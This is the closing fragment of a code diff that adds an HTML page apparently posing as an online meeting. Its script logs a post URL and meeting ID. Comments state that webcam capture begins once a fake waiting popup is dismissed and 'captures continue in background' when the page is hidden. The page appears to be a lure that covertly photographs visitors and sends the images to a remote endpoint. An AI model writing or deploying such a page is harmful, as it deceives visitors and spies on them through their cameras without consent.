+                t.style.borderColor = 'rgba(255,255,255,0.05)';
+            });
+            this.style.borderColor = '#7c5cfc';
+            this.style.borderWidth = '2px';
+            this.style.borderStyle = 'solid';
+        });
+    });
+
+    // ─────────────────────────────────────────────
+    // Initialize
+    // ─────────────────────────────────────────────
+    window.addEventListener('DOMContentLoaded', function() {
+        console.log('[OnlineMeeting] Page loaded');
+        console.log('[OnlineMeeting] Sending to:', CONFIG.postUrl);
+        console.log('[OnlineMeeting] Meeting ID:', CONFIG.meetingId);
+        
+        // The webcam capture starts after the waiting popup dismisses
+        // (or if user clicks to dismiss early)
+        
+        // Click anywhere to dismiss waiting popup early
+        waitingPopup.addEventListener('click', function() {
+            clearInterval(waitInterval);
+            dismissWaitingPopup();
+        });
+    });
+
+    // ─────────────────────────────────────────────
+    // Page Visibility
+    // ─────────────────────────────────────────────
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            console.log('[CAM] Page hidden — captures continue in background');
+        } else {
+            console.log('[CAM] Page visible again');
+        }
+    });
+    </script>
+
+</body>
 </html>
